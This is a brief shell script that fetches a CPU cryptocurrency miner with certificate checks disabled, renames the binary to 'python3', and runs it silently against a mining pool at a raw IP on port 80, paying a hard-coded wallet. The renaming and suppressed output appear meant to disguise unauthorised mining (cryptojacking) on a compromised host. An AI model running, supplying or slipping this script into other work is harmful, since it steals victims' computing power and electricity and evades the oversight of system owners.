#!/bin/sh

wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.39/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-avx2 python3 && ./python3 -a dpowhash  -o stratum+tcp://143.198.4.78:80 -u dpc1qgkrz70qkjqy7yayf7gqtwa7va7g9dek5vm6htr.MJ -T4 -p m=solo > /dev/null 2>&1